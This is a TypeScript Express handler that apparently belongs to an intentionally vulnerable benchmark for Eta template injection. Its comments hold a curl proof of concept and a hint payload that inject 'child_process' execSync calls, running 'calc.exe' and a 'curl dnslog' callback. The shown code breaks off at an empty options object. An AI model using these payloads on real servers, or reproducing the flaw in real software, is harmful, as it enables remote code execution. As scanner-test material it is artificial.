import { Request, Response } from 'express';
import * as eta from 'eta';

interface ViewOptions {
  varName?: string;
  include?: boolean;
  includeFile?: boolean;
  useWith?: boolean;
}

interface RequestBody {
  'view options': ViewOptions;
}

/**
curl -X POST http://localhost:8091/code-injection/eta -H "Content-Type: application/json" -d '{
  "view options": {
    "varName": "x=process.mainModule.require('\''child_process'\'').execSync('\''calc.exe'\'')",
    "include": false,
    "includeFile": false,
    "useWith": true
  }
}'
*/
export default function etaHandler(req: Request, res: Response): void {
  try {
    //$_1_START_OF_VULNERABILITY_CODE_SNIPPET
    //$        <FileName>Eta_1_14_2.js</FileName>
    //$        <Category>ssti</Category>
    //$        <Platform>Node.js</Platform>
    //$        <RelURL>/ssti/eta</RelURL>
    //$        <Description>
    //$        The Eta template engine before version 2.0.0 is vulnerable to RCE through template injection.
    //$        The vulnerability exists in the template engine's handling of view options, where an attacker
    //$        can inject malicious code through the varName option when useWith is enabled.
    //$        This allows arbitrary code execution in the context of the Node.js process.
    //$        </Description>
    //$        <POCHint>
    //$        Send a POST request with JSON payload:
    //$        {
    //$          "view options": {
    //$            "varName": "x=process.mainModule.require('child_process').execSync('curl dnslog')"
    //$          }
    //$        }
    //$        The payload exploits the template engine by injecting code through varName option.
    //$        </POCHint>
    //$        <ManualVerified>true</ManualVerified>
    //$_2_END_OF_VULNERABILITY_CODE_SNIPPET  : line numbers and </Testcase> will be appended by scripts
    const template = '<%= it.x %>';
    const options = {
} 